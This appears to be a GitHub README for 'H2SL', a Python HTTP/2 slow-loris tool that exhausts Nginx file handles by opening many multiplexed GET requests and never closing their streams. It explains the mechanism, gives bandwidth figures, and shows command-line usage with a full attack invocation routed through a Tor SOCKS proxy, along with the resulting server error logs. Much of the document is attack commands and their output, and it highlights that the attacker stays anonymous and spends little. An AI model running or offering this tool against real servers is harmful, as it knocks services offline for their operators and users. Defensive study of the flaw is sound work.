# H2SL: HTTP2 Slow Loris (v1.0!)
## What is this?
This is, as usual, the result of an experiment.

I was analyzing the HTTP2 protocol on Nginx, more specifically the multiplexing aspect of it, when I noticed an interesting thing.
NDA: Everything has been tested on the default Ubuntu installer 1.18.0 and the stable 1.22.1.

I noticed that in Nginx (and probably in other webservers too), using HTTP2 and making a GET request to a big file (>1MB seems enough) a file handler gets spawned and stays locked (plainly visible by launching lsof on the target file) even if the end_stream header is not present and even if no file read is actually requested.

Knowing this I noticed that the maximum available handlers I could open on Nginx (per TCP stream) is 129, which seems consistent on all my virtualized systems.

I then proceeded into writing a multithreaded python script that spawns 129 multiplexed GET requests per TCP stream, never sending the end_stream header and never actually asking for data.
In all my tests just 100 threads are well more then enough to fill the maximum allowed open files for a regular linux user (actually requesting 100*129 open files == 12'900 file handles)

This results in Nginx just plainly stopping answering regularly and starting to answer with only **errors 500**, filling the logs with:
```
2023/02/20 22:33:16 [crit] 3078387#3078387: accept4() failed (24: Too many open files)
```

These requests will stay up until nginx starts to starve them (~60s), but then we can directly reuse the same socket completely restarting an HTTP2 connection.

All this uses little to no bandwidth, and it's perfectly doable under TOR network too.
In my tests 100 threads can be kept online with just **~3mbps of upload speed** and less than **0.5mbps of download speed** or 500 threads can be kept online with just **~7mbps of upload speed** and **less then 1mbps of download speed**, with basically 0% CPU usage from the attacker side, so it's absolutely plausible to believe that an attacker host could reach way more than a few thousands threads.
### TL;DR:
**It works perfectly with nginx using http2.**

MIGHT work on other webservers too. I haven't personally tested that.
## Usage

```
~$ python -BO ./h2sl.py -h
usage: h2sl.py [-h] [--port PORT] [--threads THREADS] [--requests REQUESTS] [--filepath FILEPATH] [--wait WAIT] [--proxy PROXY] server_name

H2SL - HTTP2 Slow Loris v1.0 by ShotokanZH

positional arguments:
  server_name           the IP or hostname to attack

options:
  -h, --help            show this help message and exit
  --port PORT, -p PORT  the HTTPS port where an HTTP2 server is listening (Default: 443)
  --threads THREADS, -t THREADS
                        number of threads, as a 'thumb rule' 100 is usually enough for a standard nginx. (Default: 1)
  --requests REQUESTS, -r REQUESTS
                        requests per HTTP2 connection, multiplexed, default should be the nginx max (Default: 129)
  --filepath FILEPATH, -f FILEPATH
                        path to a big file, >1MB preferred (Default: /)
  --wait WAIT, -w WAIT  waiting time to start a new thread if no ack is received, in seconds (Default: 1)
  --proxy PROXY, -x PROXY
                        uses the selected socks4/5 proxy. Example: socks4://127.0.0.1:9050
```

To make it work we need a big static file (~>1MB) passed as argument to `--filepath`, such as an image, a big css or a video.

For the sake of clarity, '`/bigimage.png`' will be used in the following example

```shell
~$ python3 -m pip install -r requirements.txt
~$ python3 -BO h2sl.py evil_website.com --filepath '/bigimage.png' --threads 100 --proxy socks4://127.0.0.1:9050
H2SL - HTTP2 Slow Loris v1.0 by ShotokanZH

Using socks proxy: {'version': '4', 'host': '127.0.0.1', 'port': 9050}

Checking http2.. OK!

Starting threads..
Starting thread |█████████████████████████████████| 100.0% - 100/100

H2SL Online! (^C to quit)
```

On the remote server we can check the open file handlers like this:
```shell
~$ lsof /path/to/bigimage.png | wc -l
11994
```
And Nginx error log is just filled with:
```
2023/02/22 17:04:51 [crit] 3316951#3316951: accept4() failed (24: Too many open files)
2023/02/22 17:04:51 [crit] 3316947#3316947: accept4() failed (24: Too many open files)
2023/02/22 17:04:52 [crit] 3316951#3316951: accept4() failed (24: Too many open files)
2023/02/22 17:04:52 [crit] 3316947#3316947: accept4() failed (24: Too many open files)
2023/02/22 17:04:52 [crit] 3316951#3316951: accept4() failed (24: Too many open files)
2023/02/22 17:04:52 [crit] 3316947#3316947: accept4() failed (24: Too many open files)
2023/02/22 17:04:53 [crit] 3316951#3316951: accept4() failed (24: Too many open files)
```

The server should be completely unresponsive after just 100 threads.
### Special thanks
[@Gpericol](https://github.com/gpericol)